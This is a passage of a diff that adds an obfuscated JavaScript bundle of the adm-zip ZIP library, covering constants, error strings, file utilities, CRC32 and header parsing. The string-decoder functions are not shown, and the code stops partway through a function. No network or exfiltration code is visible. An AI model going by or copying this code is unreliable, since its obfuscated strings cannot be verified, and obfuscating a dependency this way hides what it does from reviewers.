@@ -1,0 +1,2729 @@
+const tE = m;
+(function (D, z) {
+    const tA = m, e = D();
+    while (!![]) {
+        try {
+            const Q = -parseInt(tA(0x181)) / 0x1 + -parseInt(tA(0x33f)) / 0x2 * (-parseInt(tA(0x1c9)) / 0x3) + -parseInt(tA(0x2f8)) / 0x4 * (-parseInt(tA(0x192)) / 0x5) + -parseInt(tA(0x395)) / 0x6 * (parseInt(tA(0x324)) / 0x7) + -parseInt(tA(0x1f3)) / 0x8 + parseInt(tA(0x26d)) / 0x9 + -parseInt(tA(0x176)) / 0xa;
+            if (Q === z)
+                break;
+            else
+                e['push'](e['shift']());
+        } catch (h) {
+            e['push'](e['shift']());
+        }
+    }
+}(t, 0x926e2));
+var B = Object[tE(0x25a)], r = (D, z) => function __require() {
+        const tV = tE, e = {};
+        return e[tV(0x2a5)] = {}, (z || (0x0, D[B(D)[0x0]])((z = e)['exports'], z), z[tV(0x2a5)]);
+    };
+const X = {};
+X['node_modules/adm-zip/util/constants.js'] = function (z, e) {
+    const ti = tE, Q = {};
+    Q[ti(0x19a)] = 0x1e, Q[ti(0x1e8)] = 0x4034b50, Q['LOCVER'] = 0x4, Q[ti(0x2a4)] = 0x6, Q[ti(0x249)] = 0x8, Q[ti(0x215)] = 0xa, Q['LOCCRC'] = 0xe, Q['LOCSIZ'] = 0x12, Q['LOCLEN'] = 0x16, Q[ti(0x37c)] = 0x1a, Q[ti(0x1f4)] = 0x1c, Q[ti(0x22f)] = 0x8074b50, Q['EXTHDR'] = 0x10, Q['EXTCRC'] = 0x4, Q[ti(0x31b)] = 0x8, Q['EXTLEN'] = 0xc, Q[ti(0x36d)] = 0x2e, Q[ti(0x368)] = 0x2014b50, Q['CENVEM'] = 0x4, Q[ti(0x1d3)] = 0x6, Q['CENFLG'] = 0x8, Q['CENHOW'] = 0xa, Q[ti(0x3ab)] = 0xc, Q[ti(0x2d2)] = 0x10, Q[ti(0x17f)] = 0x14, Q[ti(0x271)] = 0x18, Q[ti(0x2d0)] = 0x1c, Q[ti(0x18f)] = 0x1e, Q[ti(0x304)] = 0x20, Q[ti(0x359)] = 0x22, Q[ti(0x275)] = 0x24, Q[ti(0x33a)] = 0x26, Q[ti(0x1c6)] = 0x2a, Q[ti(0x362)] = 0x16, Q[ti(0x1aa)] = 0x6054b50, Q[ti(0x2d3)] = 0x8, Q[ti(0x382)] = 0xa, Q['ENDSIZ'] = 0xc, Q['ENDOFF'] = 0x10, Q[ti(0x29b)] = 0x14, Q[ti(0x2e0)] = 0x14, Q[ti(0x259)] = 0x7064b50, Q[ti(0x35c)] = 0x4, Q[ti(0x337)] = 0x8, Q[ti(0x1bd)] = 0x10, Q[ti(0x390)] = 0x6064b50, Q[ti(0x223)] = 0x38, Q[ti(0x307)] = 0xc, Q[ti(0x38f)] = 0x4, Q[ti(0x384)] = 0xc, Q['ZIP64VER'] = 0xe, Q[ti(0x1c2)] = 0x10, Q[ti(0x39d)] = 0x14, Q['ZIP64SUB'] = 0x18, Q[ti(0x396)] = 0x20, Q[ti(0x167)] = 0x28, Q[ti(0x197)] = 0x30, Q[ti(0x254)] = 0x38, Q['STORED'] = 0x0, Q[ti(0x1ee)] = 0x1, Q[ti(0x38b)] = 0x2, Q[ti(0x301)] = 0x3, Q[ti(0x2e4)] = 0x4, Q[ti(0x338)] = 0x5, Q['IMPLODED'] = 0x6, Q['DEFLATED'] = 0x8, Q[ti(0x168)] = 0x9, Q[ti(0x2c9)] = 0xa, Q['BZIP2'] = 0xc, Q[ti(0x28d)] = 0xe, Q[ti(0x1be)] = 0x12, Q[ti(0x334)] = 0x13, Q[ti(0x378)] = 0x63, Q['FLG_ENC'] = 0x1, Q[ti(0x1b2)] = 0x2, Q[ti(0x3b2)] = 0x4, Q['FLG_DESC'] = 0x8, Q['FLG_ENH'] = 0x10, Q['FLG_PATCH'] = 0x20, Q['FLG_STR'] = 0x40, Q['FLG_EFS'] = 0x800, Q[ti(0x2d1)] = 0x1000, Q[ti(0x290)] = 0x2, Q[ti(0x381)] = 0x1, Q['NONE'] = 0x0, Q[ti(0x356)] = 0x0, Q[ti(0x23c)] = 0x2, Q['ID_ZIP64'] = 0x1, Q[ti(0x31f)] = 0x7, Q[ti(0x21d)] = 0x8, Q['ID_OS2'] = 0x9, Q['ID_NTFS'] = 0xa, Q[ti(0x294)] = 0xc, Q[ti(0x26c)] = 0xd, Q[ti(0x21c)] = 0xe, Q[ti(0x26f)] = 0xf, Q['ID_X509_PKCS7'] = 0x14, Q[ti(0x375)] = 0x15, Q[ti(0x28c)] = 0x16, Q[ti(0x314)] = 0x17, Q[ti(0x1a8)] = 0x18, Q['ID_X509_PKCS7_RL'] = 0x19, Q[ti(0x38a)] = 0x65, Q['ID_IBM2'] = 0x66, Q[ti(0x2d7)] = 0x4690, Q[ti(0x305)] = 0xffffffff, Q[ti(0x173)] = 0xffff, Q[ti(0x211)] = 0x0, Q[ti(0x393)] = 0x8, Q[ti(0x1a1)] = 0x10, Q['EF_ZIP64_DSN'] = 0x18, e[ti(0x2a5)] = Q;
+};
+var require_constants = r(X), require_errors = r({
+        'node_modules/adm-zip/util/errors.js'(z) {
+            const to = tE, e = {};
+            e['INVALID_LOC'] = to(0x2b4), e[to(0x332)] = to(0x1af), e['INVALID_END'] = 'Invalid\x20END\x20header\x20(bad\x20signature)', e[to(0x224)] = 'No\x20descriptor\x20present', e[to(0x320)] = to(0x21a), e[to(0x18e)] = to(0x1e9), e['NO_DATA'] = 'Nothing\x20to\x20decompress', e['BAD_CRC'] = to(0x1c5), e[to(0x260)] = 'There\x20is\x20a\x20file\x20in\x20the\x20way:\x20{0}', e['UNKNOWN_METHOD'] = to(0x19c), e[to(0x25c)] = to(0x360), e[to(0x34d)] = to(0x217), e[to(0x2c5)] = to(0x2ab), e[to(0x23a)] = to(0x293), e[to(0x370)] = to(0x388), e['INCOMPLETE_CODES'] = to(0x2de), e[to(0x252)] = to(0x2ce), e[to(0x3a0)] = to(0x397), e[to(0x1bf)] = to(0x183), e[to(0x289)] = to(0x3b0), e[to(0x35a)] = to(0x1e4),e[to(0x17a)] = to(0x16f), e[to(0x277)] = 'Number\x20of\x20disk\x20entries\x20is\x20too\x20large', e[to(0x16d)] = to(0x2df), e[to(0x309)] = to(0x2c2), e[to(0x281)] = to(0x20a), e['FILE_NOT_FOUND'] = to(0x21f), e['NOT_IMPLEMENTED'] = to(0x2f6), e[to(0x188)] = to(0x230), e['INVALID_FORMAT'] = to(0x345), e['INVALID_PASS_PARAM'] = to(0x205), e[to(0x17b)] = to(0x258), e[to(0x27e)] = to(0x2d8), e[to(0x3a9)] = 'Extra\x20field\x20parsing\x20error';
+            var Q = e;
+            function h(c) {
+                return function (...U) {
+                    const tn = m;
+                    return U[tn(0x2ca)] && (c = c[tn(0x2e8)](/\{(\d)\}/g, (f, N) => U[N] || '')), new Error('ADM-ZIP:\x20' + c);
+                };
+            }
+            for (const c of Object[to(0x2cc)](Q)) {
+                z[c] = h(Q[c]);
+            }
+        }
+    }), require_utils = r({
+        'node_modules/adm-zip/util/utils.js'(D, z) {
+            const tx = tE;
+            var fsystem = require('fs'), e = require('path'), Q = require_constants(), h = require_errors(), c = typeof process === tx(0x2e2) && tx(0x272) === process[tx(0x21e)], U = I => typeof I === tx(0x2e2) && I !== null, f = new Uint32Array(0x100)[tx(0x32b)]((I, Y) => {
+                    for (let H = 0x0; H < 0x8; H++) {
+                        (Y & 0x1) !== 0x0 ? Y = 0xedb88320 ^ Y >>> 0x1 : Y >>>= 0x1;
+                    }
+                    return Y >>> 0x0;
+                });
+            function N(I) {
+                const tw = tx;
+                this[tw(0x2a1)] = e['sep'], this['fs'] = fsystem, U(I) && (U(I['fs']) && typeof I['fs'][tw(0x1a3)] === 'function' && (this['fs'] = I['fs']));
+            }
+            z[tx(0x2a5)] = N, N[tx(0x256)]['makeDir'] = function (I) {
+                const Y = this;
+                function H(fpath) {
+                    const tv = m;
+                    let J = fpath['split'](Y[tv(0x2a1)])[0x0];
+                    fpath[tv(0x255)](Y[tv(0x2a1)])[tv(0x299)](function (K) {
+                        const tP = tv;
+                        if (!K || K[tP(0x2ee)](-0x1, 0x1) === ':')
+                            return;
+                        J += Y[tP(0x2a1)] + K;
+                        var M;
+                        try {
+                            M = Y['fs']['statSync'](J);
+                        } catch (j) {
+                            Y['fs'][tP(0x34e)](J);
+                        }
+                        if (M && M[tP(0x371)]())
+                            throw h['FILE_IN_THE_WAY']('\x22' + J + '\x22');
+                    });
+                }
+                H(I);
+            }, N['prototype'][tx(0x263)] = function (path2, I, Y, H) {
+                const tb = tx, J = this;
+                if (J['fs']['existsSync'](path2)) {
+                    if (!Y)
+                        return ![];
+                    var K = J['fs'][tb(0x1a3)](path2);
+                    if (K['isDirectory']())
+                        return ![];
+                }
+                var M = e[tb(0x367)](path2);
+                !J['fs']['existsSync'](M) && J[tb(0x229)](M);
+                var j;
+                try {
+                    j = J['fs'][tb(0x18b)](path2, 'w', 0x1b6);
+                } catch (L) {
+                    J['fs']['chmodSync'](path2, 0x1b6), j = J['fs'][tb(0x18b)](path2, 'w', 0x1b6);
+                }
+                if (j)
+                    try {
+                        J['fs'][tb(0x33e)](j, I, 0x0, I[tb(0x2ca)], 0x0);
+                    } finally {
+                        J['fs'][tb(0x28e)](j);
+                    }
+                return J['fs']['chmodSync'](path2, H || 0x1b6), !![];
+            }, N[tx(0x256)][tx(0x358)] = function (path2, I, Y, H, J) {
+                const tT = tx;
+                typeof H === tT(0x198) && (J = H, H = void 0x0);
+                const K = this;
+                K['fs']['exists'](path2, function (M) {
+                    const tq = tT;
+                    if (M && !Y)
+                        return J(![]);
+                  K['fs'][tq(0x2dd)](path2, function (j, L) {
+                        const tO = tq;
+                        if (M && L[tO(0x297)]())
+                            return J(![]);
+                        var p = e['dirname'](path2);
+                        K['fs']['exists'](p, function (g) {
+                            const tR = tO;
+                            if (!g)
+                                K[tR(0x229)](p);
+                            K['fs']['open'](path2, 'w', 0x1b6, function (u, C) {
+                                const ts = tR;
+                                if (u)
+                                    K['fs']['chmod'](path2, 0x1b6, function () {
+                                        K['fs']['open'](path2, 'w', 0x1b6, function (t0, t1) {
+                                            const tG = m;
+                                            K['fs'][tG(0x2ed)](t1, I, 0x0, I[tG(0x2ca)], 0x0, function () {
+                                                const tk = tG;
+                                                K['fs'][tk(0x1fa)](t1, function () {
+                                                    const tZ = tk;
+                                                    K['fs'][tZ(0x1d0)](path2, H || 0x1b6, function () {
+                                                        J(!![]);
+                                                    });
+                                                });
+                                            });
+                                        });
+                                    });
+                                else
+                                    C ? K['fs'][ts(0x2ed)](C, I, 0x0, I[ts(0x2ca)], 0x0, function () {
+                                        K['fs']['close'](C, function () {
+                                            const th = m;
+                                            K['fs'][th(0x1d0)](path2, H || 0x1b6, function () {
+                                                J(!![]);
+                                            });
+                                        });
+                                    }) : K['fs'][ts(0x1d0)](path2, H || 0x1b6, function () {
+                                        J(!![]);
+                                    });
+                            });
+                        });
+                    });
+                });
+            }, N[tx(0x256)][tx(0x191)] = function (path2) {
+                const I = this;
+                function Y(H, J, K) {
+                    const tc = m;
+                    typeof J === tc(0x16c) && (K = J, J = void 0x0);
+                    let M = [];
+                    return I['fs'][tc(0x226)](H)['forEach'](function (j) {
+                        const tU = tc, path3 = e[tU(0x1e6)](H, j), L = I['fs'][tU(0x1a3)](path3);
+                        (!J || J[tU(0x1ba)](path3)) && M[tU(0x1a6)](e[tU(0x383)](path3) + (L[tU(0x297)]() ? I[tU(0x2a1)] : ''));
+                        if (L[tU(0x297)]() && K)
+                            M = M[tU(0x30b)](Y(path3, J, K));
+                    }), M;
+                }
+                return Y(path2, void 0x0, !![]);
+            }, N[tx(0x256)][tx(0x2d5)] = function (I, Y) {
+                const H = this;
+                let J = [];
+                H['fs']['readdir'](I, function (K, M) {
+                    const tf = m;
+                    if (K)
+                        return Y(K);
+                    let j = M[tf(0x2ca)];
+                    if (!j)
+                        return Y(null, J);
+                    M[tf(0x299)](function (L) {
+                        const tN = tf;
+                        L = e[tN(0x1e6)](I, L), H['fs']['stat'](L, function (p, g) {
+                            const tI = tN;
+                            if (p)
+                                return Y(p);
+                            if (g) {
+                                J[tI(0x1a6)](e[tI(0x383)](L) + (g[tI(0x297)]() ? H[tI(0x2a1)] : ''));
+                                if (g['isDirectory']())
+                   H[tI(0x2d5)](L, function (u, C) {
+                                        const tY = tI;
+                                        if (u)
+                                            return Y(u);
+                                        J = J[tY(0x30b)](C);
+                                        if (!--j)
+                                            Y(null, J);
+                                    });
+                                else {
+                                    if (!--j)
+                                        Y(null, J);
+                                }
+                            }
+                        });
+                    });
+                });
+            }, N[tx(0x256)][tx(0x265)] = function () {
+            }, N['prototype'][tx(0x354)] = function () {
+            }, N['crc32update'] = function (I, Y) {
+                return f[(I ^ Y) & 0xff] ^ I >>> 0x8;
+            }, N['crc32'] = function (I) {
+                const tH = tx;
+                typeof I === tH(0x1df) && (I = Buffer[tH(0x351)](I, tH(0x31a)));
+                let Y = I[tH(0x2ca)], H = ~0x0;
+                for (let J = 0x0; J < Y;)
+                    H = N[tH(0x34a)](H, I[J++]);
+                return ~H >>> 0x0;
+            }, N[tx(0x2fc)] = function (I) {
+                const tJ = tx;
+                switch (I) {
+                case Q[tJ(0x29d)]:
+                    return tJ(0x228) + I + ')';
+                case Q[tJ(0x1cc)]:
+                    return tJ(0x16b) + I + ')';
+                default:
+                    return tJ(0x39a) + I + ')';
+                }
+            }, N['canonical'] = function (path2) {
+                const tK = tx;
+                if (!path2)
+                    return '';
+                const I = e['posix'][tK(0x383)]('/' + path2[tK(0x255)]('\x5c')[tK(0x1e6)]('/'));
+                return e[tK(0x1e6)]('.', I);
+            }, N[tx(0x389)] = function (path2) {
+                const tM = tx;
+                if (!path2)
+                    return '';
+                const I = e[tM(0x2e6)]['normalize']('/' + path2[tM(0x255)]('\x5c')[tM(0x1e6)]('/'));
+                return e[tM(0x2e6)][tM(0x1e6)]('.', I);
+            }, N[tx(0x27b)] = function (I, Y) {
+                const tj = tx;
+                if (!Array[tj(0x3a5)](I))
+                    throw new TypeError('arr\x20is\x20not\x20array');
+                const H = I['length'] >>> 0x0;
+                for (let J = H - 0x1; J >= 0x0; J--) {
+                    if (Y(I[J], J, I))
+                        return I[J];
+                }
+                return void 0x0;
+            }, N[tx(0x35f)] = function (I, Y) {
+                const tL = tx;
+                I = e[tL(0x264)](e[tL(0x383)](I));
+                var H = Y[tL(0x255)]('/');
+                for (var J = 0x0, K = H[tL(0x2ca)]; J < K; J++) {
+                    var path2 = e['normalize'](e[tL(0x1e6)](I, H[tL(0x1e1)](J, K)[tL(0x1e6)](e['sep'])));
+                    if (path2[tL(0x2f9)](I) === 0x0)
+                        return path2;
+                }
+                return e[tL(0x383)](e[tL(0x1e6)](I, e[tL(0x237)](Y)));
+            }, N[tx(0x219)] = function I(Y, H) {
+                const tp = tx;
+                if (Buffer['isBuffer'](Y))
+                    return Y;
+                else
+                    return Y instanceof Uint8Array ? Buffer[tp(0x351)](Y) : typeof Y === tp(0x1df) ? H(Y) : Buffer[tp(0x26a)](0x0);
+            }, N[tx(0x292)] = function (Y, H) {
+                const tg = tx;
+                var J = Buffer[tg(0x351)](Y[tg(0x1e1)](H, H + 0x8));
+                return J[tg(0x189)](), parseInt('0x' + J[tg(0x234)](tg(0x296)));
+            }, N['fromDOS2Date'] = function (Y) {
+                return new Date((Y >> 0x19 & 0x7f) + 0x7bc, Math['max']((Y >> 0x15 & 0xf) - 0x1, 0x0), Math['max'](Y >> 0x10 & 0x1f, 0x1), Y >> 0xb & 0x1f, Y >> 0x5 & 0x3f, (Y & 0x1f) << 0x1);
+            }, N[tx(0x1c3)] = function (Y) {
+                const tu = tx;
+                let H = 0x0, J = 0x0;
+                return Y[tu(0x1db)]() > 0x7bb && (H = (Y[tu(0x1db)]() - 0x7bc & 0x7f) << 0x9 | Y[tu(0x22e)]() + 0x1 << 0x5 | Y[tu(0x245)](), J = Y[tu(0x1cf)]() << 0xb | Y[tu(0x379)]() << 0x5 | Y[tu(0x37e)]() >> 0x1), H << 0x10 | J;
+            }, N[tx(0x37a)] = c, N[tx(0x1fc)] = f;
+        }
+    }), require_fattr = r({
+        'node_modules/adm-zip/util/fattr.js'(D, z) {
+            const tC = tE;
+            var e = require(tC(0x236));
+            z[tC(0x2a5)] = function (path2, {fs: fs2}) {
+                const m1 = tC;
+                var _path = path2 || '', Q = c(), h = null;
+                function c() {
+                    const m0 = m, U = {};
+                    return U[m0(0x250)] = ![], U['readonly'] = ![], U[m0(0x386)] = ![], U['executable'] = ![], U['mtime'] = 0x0, U[m0(0x1d8)] = 0x0, U;
+                }
+                return _path && fs2['existsSync'](_path) ? (h = fs2[m1(0x1a3)](_path), Q[m1(0x250)] = h[m1(0x297)](), Q[m1(0x37d)] = h[m1(0x37d)], Q['atime'] = h[m1(0x1d8)], Q[m1(0x387)] = (0x49 & h['mode']) !== 0x0, Q[m1(0x325)] = (0x80 & h[m1(0x186)]) === 0x0, Q[m1(0x386)] = e[m1(0x237)](_path)[0x0] === '.') : console[m1(0x2f2)](m1(0x2b0) + _path), {
+                    get 'directory'() {
+                        const m2 = m1;
+                        return Q[m2(0x250)];
+                    },
+                    get 'readOnly'() {
+                        const m3 = m1;
+                        return Q[m3(0x325)];
+                    },
+                    get 'hidden'() {
+                        return Q['hidden'];
+                    },
+                    get 'mtime'() {
+                        const m4 = m1;
+                        return Q[m4(0x37d)];
+                    },
+                    get 'atime'() {
+                        const m5 = m1;
+                        return Q[m5(0x1d8)];
+                    },
+                    get 'executable'() {
+                        const m6 = m1;
+                        return Q[m6(0x387)];
+                    },
+                    'decodeAttributes': function () {
+                    },
+                    'encodeAttributes': function () {
+                    },
+                    'toJSON': function () {
+                        const m7 = m1, U = {};
+                        return U[m7(0x236)] = _path, U['isDirectory'] = Q[m7(0x250)], U[m7(0x287)] = Q[m7(0x325)], U[m7(0x1d2)] = Q[m7(0x386)], U[m7(0x240)] = Q[m7(0x387)], U['mTime'] = Q[m7(0x37d)], U['aTime'] = Q[m7(0x1d8)], U;
+                    },
+                    'toString': function () {
+                        const m8 = m1;
+                        return JSON['stringify'](this[m8(0x3a1)](), null, '\x09');
+                    }
+                };
+            };
+        }
+    }), require_decoder = r({
+        'node_modules/adm-zip/util/decoder.js'(D, z) {
+            const m9 = tE;
+            z['exports'] = {
+                'efs': !![],
+                'encode': e => Buffer[m9(0x351)](e, 'utf8'),
+                'decode': e => e[m9(0x234)](m9(0x31a))
+            };
+        }
+    }), require_util = r({
+        'node_modules/adm-zip/util/index.js'(D, z) {
+            const mt = tE;
+            z[mt(0x2a5)] = require_utils(), z[mt(0x2a5)][mt(0x3ae)] = require_constants(), z['exports']['Errors'] = require_errors(), z[mt(0x2a5)]['FileAttr'] = require_fattr(), z['exports'][mt(0x1d6)] = require_decoder();
+        }
+    }), require_entryHeader = r({
+        'node_modules/adm-zip/headers/entryHeader.js'(D, z) {
+            const mm = tE;
+            var e = require_util(), Q = e[mm(0x3ae)];
+            z[mm(0x2a5)] = function () {
+                const mD = mm;
+                var h = 0x14, c = 0xa, U = 0x0, f = 0x0, N = 0x0, I = 0x0, Y = 0x0, H = 0x0, J = 0x0, K = 0x0, M = 0x0, j = 0x0, L = 0x0, p = 0x0, _offset = 0x0;
+                h |= e['isWin'] ? 0xa00 : 0x300, U |= Q[mD(0x28a)];
+                const g = {};
+                g['extraLen'] = 0x0;
+                const u = g, C = t2 => Math[mD(0x2ea)](0x0, t2) >>> 0x0, t0 = t2 => Math['max'](0x0, t2) & 0xffff, t1 = t2 => Math[mD(0x2ea)](0x0, t2) & 0xff;
+                return N = e[mD(0x1c3)](new Date()), {
+                    get 'made'() {
+                        return h;
+                    },
+                    set 'made'(t2) {
+                        h = t2;
+                    },
+                    get 'version'() {
+                        return c;
+                    },
+                    set 'version'(t2) {
+                        c = t2;
+                    },
+                    get 'flags'() {
+                        return U;
+                    },
+                    set 'flags'(t2) {
+                        U = t2;
+                    },
+                    get 'flags_efs'() {
+                        const ml = mD;
+                        return (U & Q[ml(0x28a)]) > 0x0;
+                    },
+                    set 'flags_efs'(t2) {
+                        const mz = mD;
+                        t2 ? U |= Q[mz(0x28a)] : U &= ~Q['FLG_EFS'];
+                    },
+                    get 'flags_desc'() {
+                        return (U & Q['FLG_DESC']) > 0x0;
+                    },
+                    set 'flags_desc'(t2) {
+                        const me = mD;
+                        t2 ? U |= Q[me(0x22c)] : U &= ~Q['FLG_DESC'];
+                    },
+                    get 'method'() {
+                        return f;
+                    },
+                    set 'method'(t2) {
+                        const mQ = mD;
+                        switch (t2) {
+                        case Q[mQ(0x29d)]:
+                            this['version'] = 0xa;
+                        case Q[mQ(0x1cc)]:
+                        default:
+                            this[mQ(0x2da)] = 0x14;
+                        }
+                        f = t2;
+                    },
+                    get 'time'() {
+                        const mB = mD;
+                        return e[mB(0x1b1)](this[mB(0x199)]);
+                    },
+                    set 'time'(t2) {
+                        const mr = mD;
+                        this[mr(0x199)] = e['fromDate2DOS'](t2);
+                    },
+                    get 'timeval'() {
+                        return N;
+                    },
+                    set 'timeval'(t2) {
+                        N = C(t2);
+                    },
+                    get 'timeHighByte'() {
+                        return t1(N >>> 0x8);
+                    },
+                    get 'crc'() {
+                        return I;
+                    },
+                    set 'crc'(t2) {
+                        I = C(t2);
+                    },
+                    get 'compressedSize'() {
+                        return Y;
+                    },
+                    set 'compressedSize'(t2) {
+                        Y = C(t2);
+                    },
+                    get 'size'() {
+                        return H;
+                    },
+                    set 'size'(t2) {
+                        H = C(t2);
+                    },
+                    get 'fileNameLength'() {
+                        return J;
+                    },
+                    set 'fileNameLength'(t2) {
+                        J = t2;
+                    },
+                    get 'extraLength'() {
+                        return K;
+                    },
+                    set 'extraLength'(t2) {
+                        K = t2;
+                    },
+                    get 'extraLocalLength'() {
+                        const mX = mD;
+                        return u[mX(0x32f)];
+                    },
+                    set 'extraLocalLength'(t2) {
+                        const my = mD;
+                        u[my(0x32f)] = t2;
+                    },
+                    get 'commentLength'() {
+                        return M;
+                    },
+                    set 'commentLength'(t2) {
+                        M = t2;
+                    },
+                    get 'diskNumStart'() {
+                        return j;
+                    },
+                    set 'diskNumStart'(t2) {
+                        j = C(t2);
+                    },
+                    get 'inAttr'() {
+                        return L;
+                    },
+                    set 'inAttr'(t2) {
+                        L = C(t2);
+                    },
+                    get 'attr'() {
+                        return p;
+                    },
+                    set 'attr'(t2) {
+                        p = C(t2);
+                    },
+                    get 'fileAttr'() {
+                        return (p || 0x0) >> 0x10 & 0xfff;
+                    },
+                    get 'offset'() {
+                        return _offset;
+                    },
+                    set 'offset'(t2) {
+                        _offset = C(t2);
+                    },
+                    get 'encrypted'() {
+                        const md = mD;
+                        return (U & Q[md(0x363)]) === Q[md(0x363)];
+                    },
+                    get 'centralHeaderSize'() {
+                        const ma = mD;
+                        return Q[ma(0x36d)] + J + K + M;
+                    },
+                    get 'realDataOffset'() {
+                        const mW = mD;
+                        return _offset + Q['LOCHDR'] + u['fnameLen'] + u[mW(0x32f)];
+                    },
+                    get 'localHeader'() {
+                        return u;
+                    },
+                    'loadLocalHeaderFromBinary': function (t2) {
+                        const mF = mD;
+                        var t3 = t2[mF(0x1e1)](_offset, _offset + Q[mF(0x19a)]);
+                        if (t3['readUInt32LE'](0x0) !== Q[mF(0x1e8)])
+                            throw e['Errors'][mF(0x204)]();
+                        u['version'] = t3[mF(0x1eb)](Q[mF(0x2c3)]), u[mF(0x194)] = t3[mF(0x1eb)](Q[mF(0x2a4)]), u[mF(0x333)] = t3[mF(0x1eb)](Q[mF(0x249)]), u[mF(0x2d4)] = t3[mF(0x243)](Q[mF(0x215)]), u[mF(0x29e)] = t3[mF(0x243)](Q[mF(0x398)]), u[mF(0x316)] = t3[mF(0x243)](Q[mF(0x19d)]), u[mF(0x3a2)] = t3[mF(0x243)](Q['LOCLEN']), u[mF(0x37b)] = t3['readUInt16LE'](Q[mF(0x37c)]), u[mF(0x32f)] = t3['readUInt16LE'](Q['LOCEXT']);
+                        const t4 = _offset + Q['LOCHDR'] + u['fnameLen'], t5 = t4 + u[mF(0x32f)];
+                        return t2['slice'](t4, t5);
+                    },
+                    'loadFromBinary': function (t2) {
+                        const mS = mD;
+                        if (t2[mS(0x2ca)] !== Q[mS(0x36d)] || t2[mS(0x243)](0x0) !== Q[mS(0x368)])
+                            throw e[mS(0x26b)][mS(0x332)]();
+                        h = t2[mS(0x1eb)](Q[mS(0x1ed)]), c = t2['readUInt16LE'](Q[mS(0x1d3)]), U = t2[mS(0x1eb)](Q[mS(0x268)]), f = t2[mS(0x1eb)](Q[mS(0x1ae)]), N = t2[mS(0x243)](Q[mS(0x3ab)]), I = t2[mS(0x243)](Q[mS(0x2d2)]), Y = t2[mS(0x243)](Q[mS(0x17f)]), H = t2['readUInt32LE'](Q[mS(0x271)]), J = t2[mS(0x1eb)](Q[mS(0x2d0)]), K = t2[mS(0x1eb)](Q[mS(0x18f)]), M = t2[mS(0x1eb)](Q['CENCOM']), j = t2[mS(0x1eb)](Q[mS(0x359)]), L = t2['readUInt16LE'](Q[mS(0x275)]), p = t2['readUInt32LE'](Q['CENATX']), _offset = t2[mS(0x243)](Q['CENOFF']);
+                    },
+                    'localHeaderToBinary': function () {
+                        const mA = mD;
+                        var t2 = Buffer[mA(0x26a)](Q['LOCHDR']);
+                        return t2[mA(0x2f3)](Q['LOCSIG'], 0x0), t2[mA(0x17e)](c, Q['LOCVER']), t2[mA(0x17e)](U, Q[mA(0x2a4)]), t2[mA(0x17e)](f, Q['LOCHOW']), t2[mA(0x2f3)](N, Q[mA(0x215)]), t2[mA(0x2f3)](I, Q['LOCCRC']), t2[mA(0x2f3)](Y, Q[mA(0x19d)]), t2['writeUInt32LE'](H, Q[mA(0x2be)]), t2['writeUInt16LE'](J, Q[mA(0x37c)]), t2[mA(0x17e)](u['extraLen'], Q[mA(0x1f4)]), t2;
+                    },
+                    'centralHeaderToBinary': function () {
+                        const mE = mD;
+                        var t2 = Buffer[mE(0x26a)](Q[mE(0x36d)] + J + K + M);
+                        return t2[mE(0x2f3)](Q[mE(0x368)], 0x0), t2[mE(0x17e)](h, Q[mE(0x1ed)]), t2[mE(0x17e)](c, Q[mE(0x1d3)]), t2[mE(0x17e)](U, Q[mE(0x268)]), t2['writeUInt16LE'](f, Q['CENHOW']), t2[mE(0x2f3)](N, Q[mE(0x3ab)]), t2['writeUInt32LE'](I, Q[mE(0x2d2)]), t2[mE(0x2f3)](Y, Q['CENSIZ']), t2[mE(0x2f3)](H, Q['CENLEN']), t2[mE(0x17e)](J, Q[mE(0x2d0)]), t2['writeUInt16LE'](K, Q[mE(0x18f)]), t2[mE(0x17e)](M, Q['CENCOM']), t2[mE(0x17e)](j, Q[mE(0x359)]), t2[mE(0x17e)](L, Q[mE(0x275)]), t2[mE(0x2f3)](p, Q[mE(0x33a)]), t2[mE(0x2f3)](_offset, Q['CENOFF']), t2;
+                    },
+                    'toJSON': function () {
+                        const mi = mD, t2 = function (t3) {
+                                const mV = m;
+                                return t3 + mV(0x31d);
+                            };
+                        return {
+                            'made': h,
+                            'version': c,
+                            'flags': U,
+                            'method': e[mi(0x2fc)](f),
+                            'time': this['time'],
+                            'crc': '0x' + I[mi(0x234)](0x10)[mi(0x2e5)](),
+                            'compressedSize': t2(Y),
+                            'size': t2(H),
+                            'fileNameLength': t2(J),
+                            'extraLength': t2(K),
+                            'commentLength': t2(M),
+                            'diskNumStart': j,
+                            'inAttr': L,
+                            'attr': p,
+                            'offset': _offset,
+                            'centralHeaderSize': t2(Q['CENHDR'] + J + K + M)
+                        };
+                    },
+                    'toString': function () {
+                        const mo = mD;
+                        return JSON[mo(0x39f)](this[mo(0x3a1)](), null, '\x09');
+                    }
+                };
+            };
+        }
+    }), require_mainHeader = r({
+        'node_modules/adm-zip/headers/mainHeader.js'(D, z) {
+            const mn = tE;
+            var e = require_util(), Q = e[mn(0x3ae)];
+            z['exports'] = function () {
+                var h = 0x0, c = 0x0, U = 0x0, _offset = 0x0, f = 0x0;
+                return {
+                    get 'diskEntries'() {
+                        return h;
+                    },
+                    set 'diskEntries'(N) {
+                        h = c = N;
+                    },
+                    get 'totalEntries'() {
+                        return c;
+                    },
+                    set 'totalEntries'(N) {
+                        c = h = N;
+                    },
+                    get 'size'() {
+                        return U;
+                    },
+                    set 'size'(N) {
+                        U = N;
+                    },
+                    get 'offset'() {
+                        return _offset;
+                    },
+                    set 'offset'(N) {
+                        _offset = N;
+                    },
+                    get 'commentLength'() {
+                        return f;
+                    },
+                    set 'commentLength'(N) {
+                        f = N;
+                    },
+                    get 'mainHeaderSize'() {
+                        return Q['ENDHDR'] + f;
+                    },
+                    'loadFromBinary': function (N) {
+                        const mx = m;
+                        if ((N[mx(0x2ca)] !== Q[mx(0x362)] || N[mx(0x243)](0x0) !== Q[mx(0x1aa)]) && (N[mx(0x2ca)] < Q['ZIP64HDR'] || N[mx(0x243)](0x0) !== Q[mx(0x390)]))
+                            throw e[mx(0x26b)][mx(0x2fe)]();
+                        N[mx(0x243)](0x0) === Q[mx(0x1aa)] ? (h = N['readUInt16LE'](Q[mx(0x2d3)]), c = N[mx(0x1eb)](Q['ENDTOT']), U = N['readUInt32LE'](Q['ENDSIZ']), _offset = N[mx(0x243)](Q[mx(0x331)]), f = N[mx(0x1eb)](Q[mx(0x29b)])) : (h = e[mx(0x292)](N, Q[mx(0x399)]), c = e[mx(0x292)](N, Q[mx(0x396)]), U = e[mx(0x292)](N, Q[mx(0x38f)]), _offset = e[mx(0x292)](N, Q[mx(0x197)]), f = 0x0);
+                    },
+                    'toBinary': function () {
+                        const mw = m;
